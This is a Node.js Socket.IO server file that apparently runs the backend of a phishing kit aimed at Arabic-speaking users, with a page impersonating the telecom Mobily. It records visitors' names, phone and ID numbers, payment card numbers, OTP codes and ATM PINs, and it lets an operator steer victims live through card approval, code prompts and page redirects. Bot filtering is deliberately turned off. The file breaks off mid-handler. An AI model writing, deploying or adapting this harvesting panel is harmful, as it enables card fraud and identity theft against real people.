const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const fs = require("fs");
const path = require("path");
const httpProxy = require("http-proxy");
require("dotenv").config();

const app = express();
const server = http.createServer(app);

// CORS Configuration
const corsOptions = {
  origin: process.env.CLIENT_URL || "*",
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(cookieParser());
app.use('/admin', express.static('admin'));

// Socket.IO Configuration
const io = new Server(server, {
  cors: corsOptions,
  transports: ["websocket", "polling"],
});

// Data file path
const DATA_DIR = process.env.NODE_ENV === 'production' ? '/data' : __dirname;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
  };
}

// Save data to file with backup (async, non-blocking)
let saveTimer = null;
let isSaving = false;

function saveData() {
  // Debounce: wait 2 seconds before saving to batch multiple saves together
  if (saveTimer) clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    _doSave();
  }, 2000);
}

// Force immediate save (for shutdown)
function saveDataImmediate() {
  if (saveTimer) clearTimeout(saveTimer);
  _doSaveSync();
}

// Async save - does not block the server
async function _doSave() {
  if (isSaving) return; // Skip if already saving
  isSaving = true;
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data);
    
    // Async write - non-blocking
    const fsPromises = require('fs').promises;
    if (fs.existsSync(DATA_FILE)) {
      await fsPromises.copyFile(DATA_FILE, BACKUP_FILE).catch(() => {});
    }
    await fsPromises.writeFile(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors`);
  } catch (error) {
    console.error("Error saving data:", error);
  } finally {
    isSaving = false;
  }
}

// Sync save - only for shutdown
function _doSaveSync() {
  ensureDataDir();
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data);
    if (fs.existsSync(DATA_FILE)) {
      try { fs.copyFileSync(DATA_FILE, BACKUP_FILE); } catch(e) {}
    }
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved (sync): ${savedVisitors.length} visitors`);
  } catch (error) {
    console.error("Error saving data (sync):", error);
  }
}

// Initialize data from file
const savedData = loadSavedData();
const visitors = new Map(); // Start with empty Map - no sockets connected on fresh start
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)

// CRITICAL: On server startup, mark ALL saved visitors as disconnected
// No sockets are connected when server starts fresh
savedVisitors.forEach(v => {
  v.isConnected = false;
});
console.log(`Marked all ${savedVisitors.length} saved visitors as disconnected on startup`);

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the last IP from x-forwarded-for (the external/public IP)
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[ips.length - 1]; // Use the last IP (external)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Check if user agent is a bot or crawler - COMPREHENSIVE BLOCKING
// Bot check DISABLED
function isBot(ua) {
  return false;
}

// Visitor validation DISABLED - allow everyone
function isValidVisitor(ua) {
  return true;
}

// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    const existing = savedVisitors[existingIndex];
    // Deep merge: preserve arrays by keeping the longer/more complete version
    const merged = { ...existing, ...visitor };
    
    // For critical arrays, always keep the one with more entries
    if (existing.dataHistory && visitor.dataHistory) {
      merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length 
        ? [...existing.dataHistory] : [...visitor.dataHistory];
    }
    if (existing.paymentCards && visitor.paymentCards) {
      merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length 
        ? [...existing.paymentCards] : [...visitor.paymentCards];
    }
    if (existing.digitCodes && visitor.digitCodes) {
      merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length 
        ? [...existing.digitCodes] : [...visitor.digitCodes];
    }
    if (existing.chatMessages && visitor.chatMessages) {
      merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length 
        ? [...existing.chatMessages] : [...visitor.chatMessages];
    }
    // For flat data object, merge both to keep all keys
    if (existing.data && visitor.data) {
      merged.data = { ...existing.data, ...visitor.data };
    }
    // Preserve important flags - never lose them
    if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
    if (existing.fullName) merged.fullName = merged.fullName || existing.fullName;
    if (existing.phone) merged.phone = merged.phone || existing.phone;
    if (existing.idNumber) merged.idNumber = merged.idNumber || existing.idNumber;
    if (existing.network) merged.network = merged.network || existing.network;
    
    savedVisitors[existingIndex] = merged;
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// Auto-save all visitor data every 30 seconds as safety net
setInterval(() => {
  // Get set of currently connected visitor IDs
  const connectedIds = new Set();
  visitors.forEach((visitor) => {
    connectedIds.add(visitor._id);
    const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
    if (existingIndex >= 0) {
      const existing = savedVisitors[existingIndex];
      const merged = { ...existing, ...visitor };
      if (existing.dataHistory && visitor.dataHistory) {
        merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length 
          ? [...existing.dataHistory] : [...visitor.dataHistory];
      }
      if (existing.paymentCards && visitor.paymentCards) {
        merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length 
          ? [...existing.paymentCards] : [...visitor.paymentCards];
      }
      if (existing.digitCodes && visitor.digitCodes) {
        merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length 
          ? [...existing.digitCodes] : [...visitor.digitCodes];
      }
      if (existing.chatMessages && visitor.chatMessages) {
        merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length 
          ? [...existing.chatMessages] : [...visitor.chatMessages];
      }
      if (existing.data && visitor.data) {
        merged.data = { ...existing.data, ...visitor.data };
      }
      if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
      merged.isConnected = true;
      savedVisitors[existingIndex] = merged;
    }
  });
  
  // CRITICAL: Mark all saved visitors NOT in the active Map as disconnected
  savedVisitors.forEach(v => {
    if (!connectedIds.has(v._id)) {
      v.isConnected = false;
    }
  });
  
  saveData();
}, 30000); // Every 30 seconds

// Helper: Find visitor by socketId (checks Map first, then searches by _id or previousSocketIds)
function findVisitorAndSocket(socketId) {
  // Direct lookup first
  const visitor = visitors.get(socketId);
  if (visitor) return { visitor, currentSocketId: socketId };
  
  // If not found, search all visitors for matching socketId, _id, or previousSocketIds
  for (const [sid, v] of visitors) {
    if (v.socketId === socketId || v._id === socketId) {
      return { visitor: v, currentSocketId: sid };
    }
    // Check previous socketIds (from before reconnect)
    if (v.previousSocketIds && v.previousSocketIds.includes(socketId)) {
      return { visitor: v, currentSocketId: sid };
    }
  }
  
  return { visitor: null, currentSocketId: socketId };
}

// Socket.IO Connection Handler
io.on("connection", (socket) => {
  console.log(`New connection: ${socket.id}`);

  // Handle visitor registration
  socket.on("visitor:register", (data) => {
    const visitorInfo = getVisitorInfo(socket);
    
    // Block bots and unknown visitors
    if (!isValidVisitor(visitorInfo.userAgent)) {
      console.log(`Blocked bot/unknown visitor: ${visitorInfo.ip}, UA: ${visitorInfo.userAgent}`);
      socket.disconnect();
      return;
    }
    
    const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
    
    // Get existing visitor ID from client (localStorage)
    const existingVisitorId = data?.existingVisitorId;
    
    // Check if this visitor already exists based on visitor ID from localStorage
    let existingVisitor = null;
    if (existingVisitorId) {
      existingVisitor = savedVisitors.find(v => v._id === existingVisitorId);
      console.log(`Looking for existing visitor with ID: ${existingVisitorId}, found: ${!!existingVisitor}`);
    }

    let visitor;
    let isNewVisitor = false;

    if (existingVisitor) {
      // Update existing visitor with new socketId
      // Keep track of previous socketIds so admin can still find this visitor
      const prevSocketIds = existingVisitor.previousSocketIds || [];
      if (existingVisitor.socketId && existingVisitor.socketId !== socket.id) {
        prevSocketIds.push(existingVisitor.socketId);
        // CRITICAL: Remove old socket entry from active visitors Map to prevent ghost entries
        visitors.delete(existingVisitor.socketId);
      }
      // Also clean up any other Map entries with the same _id (from previous reconnects)
      for (const [sid, v] of visitors) {
        if (v._id === existingVisitor._id && sid !== socket.id) {
          visitors.delete(sid);
        }
      }
      visitor = {
        ...existingVisitor,
        socketId: socket.id,
        previousSocketIds: prevSocketIds.slice(-5), // Keep last 5 socketIds
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      // Update in savedVisitors
      const index = savedVisitors.findIndex(v => v._id === existingVisitor._id);
      if (index >= 0) {
        savedVisitors[index] = visitor;
      }
      console.log(`Returning visitor reconnected: ${visitor._id}`);
    } else {
      // Create new visitor
      visitorCounter++;
      visitor = {
        _id: `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`,
        socketId: socket.id,
        visitorNumber: visitorCounter,
        createdAt: new Date().toISOString(),
        isRead: false,
        fullName: "",
        phone: "",
        idNumber: "",
        apiKey: generateApiKey(),
        ip: visitorInfo.ip,
        country: visitorInfo.country,
        city: "",
        os,
        device,
        browser,
        date: new Date().toISOString(),
        blockedCardPrefixes: [],
        page: "الصفحة الرئيسية",
        data: {},
        dataHistory: [],
        paymentCards: [],
        rejectedCards: [],
        digitCodes: [],
        hasNewData: false,
        isBlocked: false,
        isConnected: true,
        sessionStartTime: Date.now(),
        lastActivity: Date.now(),
        isIdle: false,
      };
      savedVisitors.push(visitor);
      isNewVisitor = true;
      console.log(`New visitor registered: ${visitor._id}`);
    }

    visitors.set(socket.id, visitor);
    saveData();

    // Send confirmation to visitor
    socket.emit("successfully-connected", {
      sid: socket.id,
      pid: visitor._id,
    });

    // Notify admins
    admins.forEach((admin, adminSocketId) => {
      if (isNewVisitor) {
        io.to(adminSocketId).emit("visitor:new", { ...visitor, isConnected: true });
      } else {
        io.to(adminSocketId).emit("visitor:reconnected", { visitorId: visitor._id, socketId: socket.id, page: visitor.page });
      }
    });
  });

  // Handle page enter
  socket.on("visitor:pageEnter", (page) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.page = page;
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // CRITICAL: Reset waitingForAdminResponse when visitor navigates to a new page
      visitor.waitingForAdminResponse = false;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:pageChanged", {
          visitorId: visitor._id,
          page,
          waitingForAdminResponse: false,
        });
      });
    }
  });

  // Handle more info (data submission)
  socket.on("more-info", (data) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Store submitted data with page info for ordering
      if (data.content) {
        // Initialize dataHistory if not exists
        if (!visitor.dataHistory) {
          visitor.dataHistory = [];
        }
        // Add new data entry with timestamp and page
        const now = new Date().toISOString();
        visitor.dataHistory.push({
          content: data.content,
          page: data.page,
          timestamp: now,
        });
        // Only update lastDataUpdate if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
        // Also keep flat data for backward compatibility
        visitor.data = { ...visitor.data, ...data.content };
        // تخزين اسم الشبكة إذا كان موجوداً
        if (data.content["مزود الخدمة"]) {
          visitor.network = data.content["مزود الخدمة"];
        }
      }
      if (data.paymentCard) {
        // Check if card was previously rejected by admin
        const newCardNumber = data.paymentCard.cardNumber || data.paymentCard['رقم البطاقة'] || '';
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber) && newCardNumber !== '';
        
        if (isAdminRejected) {
          const now = new Date().toISOString();
          // Save duplicate rejection
          if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
          visitor.duplicateCardRejections.push({
            cardNumber: newCardNumber,
            timestamp: now
          });
          visitor.lastDataUpdate = now;
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          
          // Notify client
          socket.emit('card:duplicateRejected', { cardNumber: newCardNumber });
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit('visitor:duplicateCard', {
              visitorId: visitor._id,
              cardNumber: newCardNumber,
              visitor: visitor
            });
          });
          
          console.log(`Duplicate card rejected for visitor ${visitor._id}: ${newCardNumber}`);
          return;
        }
        
        const now = new Date().toISOString();
        visitor.paymentCards.push({
          ...data.paymentCard,
          timestamp: now,
        });
        // Start tracking from card page
        visitor.lastDataUpdate = now;
        visitor.hasEnteredCardPage = true;
      }
      if (data.digitCode) {
        // Check for duplicate OTP
        const newCode = data.digitCode;
        const isDuplicateOtp = visitor.digitCodes.some(dc => dc.code === newCode);
        
        if (isDuplicateOtp && data.page !== "كلمة مرور ATM") {
          const now = new Date().toISOString();
          // Save duplicate rejection
          if (!visitor.duplicateOtpRejections) visitor.duplicateOtpRejections = [];
          visitor.duplicateOtpRejections.push({
            code: newCode,
            page: data.page,
            timestamp: now
          });
          visitor.lastDataUpdate = now;
          visitors.set(socket.id, visitor);
          saveVisitorPermanently(visitor);
          
          // Notify client
          socket.emit('otp:duplicateRejected', { code: newCode });
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit('visitor:duplicateOtp', {
              visitorId: visitor._id,
              code: newCode,
              page: data.page,
              visitor: visitor
            });
          });
          
          console.log(`Duplicate OTP rejected for visitor ${visitor._id}: ${newCode}`);
          return;
        }
        
        const now = new Date().toISOString();
        visitor.digitCodes.push({
          code: data.digitCode,
          page: data.page,
          timestamp: now,
        });
        // Only update if already entered card page
        if (visitor.hasEnteredCardPage) {
          visitor.lastDataUpdate = now;
        }
      }

      visitor.page = data.page;
      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
      visitor.hasNewData = true;
      visitors.set(socket.id, visitor);
      saveVisitorPermanently(visitor);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:dataSubmitted", {
          visitorId: visitor._id,
          socketId: socket.id,
          data: data,
          visitor: visitor,
        });
      });

      console.log(`Data received from visitor ${visitor._id}:`, data);
    }
  });

  // Handle card number verification
  socket.on("cardNumber:verify", (cardNumber) => {
    const visitor = visitors.get(socket.id);
    if (visitor) {
      visitor.lastActivity = Date.now();
      visitor.isIdle = false;
      // Check if card prefix is blocked
      const prefix = cardNumber.substring(0, 4);
      const isBlocked = visitor.blockedCardPrefixes.includes(prefix);

      socket.emit("cardNumber:verified", !isBlocked);

      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        // Check if visitor is idle (no activity for 60 seconds)
        let isIdle = false;
        if (isCurrentlyConnected) {
          const activeVisitorArr = Array.from(visitors.values()).find(av => av._id === v._id);
          if (activeVisitorArr && activeVisitorArr.lastActivity) {
            isIdle = (Date.now() - activeVisitorArr.lastActivity) > 60000;
          }
        }
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected, isIdle };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus);

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("form:approved");
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form approved for visitor: ${currentSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const rawSocketId = data.visitorSocketId || data;
    const { visitor, currentSocketId } = findVisitorAndSocket(rawSocketId);
    io.to(currentSocketId).emit("form:rejected");
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form rejected for visitor: ${currentSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("mobily:rejected");
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Mobily call rejected for visitor: ${currentSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("code", code);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code sent to visitor ${currentSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("visitor:navigate", page);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Navigating visitor ${currentSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("card:action", action);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      // If admin rejected the card, add last card number to rejectedCards list
      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
        if (lastCard) {
          const cardNumber = lastCard.cardNumber || lastCard['رقم البطاقة'] || '';
          if (cardNumber && !visitor.rejectedCards.includes(cardNumber)) {
            visitor.rejectedCards.push(cardNumber);
          }
        }
      }
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Card action ${action} sent to visitor ${currentSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("code:action", { action, codeIndex });
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code action ${action} sent to visitor ${currentSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("resend:approved");
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Resend approved for visitor ${currentSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", (visitorSocketId) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(currentSocketId).emit("blocked");
      console.log(`Visitor blocked: ${currentSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const { visitor, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      visitors.set(currentSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(currentSocketId).emit("unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    // Find visitor BEFORE deleting from Map
    const { visitor: visitorToDelete, currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("deleted");
    visitors.delete(currentSocketId);
    
    // Also remove from saved visitors
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${currentSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    const { currentSocketId } = findVisitorAndSocket(visitorSocketId);
    io.to(currentSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${currentSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
